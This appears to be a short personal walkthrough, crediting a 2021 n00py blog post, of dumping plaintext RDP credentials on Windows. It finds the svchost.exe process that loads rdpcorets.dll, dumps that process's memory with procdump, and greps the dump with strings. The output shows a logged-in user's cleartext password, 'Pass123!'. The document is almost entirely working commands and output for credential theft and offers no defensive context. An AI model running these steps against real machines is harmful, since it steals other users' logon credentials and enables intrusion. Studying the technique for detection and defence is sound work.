Thanks for : https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/


First lets check current logged on sessions

	PS C:\Users\Administrator> query user
	 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
	>administrator         console             1  Active      none   11/26/2021 9:13 AM
	
i will connect RDP from with another user to this machine. current sessions after RDP

	PS C:\Users\Administrator> query user
	 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
	>administrator         console             1  Active      none   11/26/2021 9:13 AM
	 superuser             rdp-tcp#3           2  Active          .  12/12/2021 8:21 PM
	 
I need to check is there any process loaded "rdpcorets.dll"

	PS C:\Users\Administrator> tasklist /M:rdpcorets.dll

	Image Name                     PID Modules
	========================= ======== ============================================
	svchost.exe                   3220 rdpcorets.dll
	
i will dump this process and get cleartext password from dump file ( svchost.exe pid is 3220)

	PS C:\Users\Administrator\Desktop> .\procdump.exe -ma 3220 -accepteula .\rdp_dump

	ProcDump v10.11 - Sysinternals process dump utility
	Copyright (C) 2009-2021 Mark Russinovich and Andrew Richards
	Sysinternals - www.sysinternals.com

	[20:26:29] Dump 1 initiated: C:\Users\Administrator\Desktop\rdp_dump.dmp
	[20:26:30] Dump 1 writing: Estimated dump file size is 151 MB.
	[20:26:32] Dump 1 complete: 151 MB written in 2.7 seconds
	[20:26:32] Dump count reached.
	
String search inside of dump file

	strings -el rdp_dump.dmp | grep superuser -C5
	
	.
	.
	.
	1716743c-0aac-49e2-8b90-8fef785
	Turkey Standard Time
	CHILD
	superuser
	Pass123!
	Chan::
	gram
	.
	.
	.
